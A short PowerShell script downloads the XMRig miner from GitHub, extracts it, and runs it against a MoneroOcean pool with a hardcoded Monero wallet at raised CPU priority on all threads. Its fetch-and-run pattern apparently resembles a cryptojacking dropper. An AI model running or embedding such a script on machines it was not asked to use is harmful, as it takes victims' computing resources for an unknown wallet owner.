$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
$server = "gulf.moneroocean.stream:10032"
$user = "47XoXb55DyecrQ1aaBnqXdZiDntoLvXpZTcd6g5mjLHqgx3yMvTTMccNdPnnZxoXA48DzFBGrjoVi4jko7bxTJbr6zZQjjZ"
$password = "triage"

Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip

.\xmrig\xmrig-6.21.3\xmrig.exe -o $server -u $user -p $password --cpu-priority 4 --threads $threads
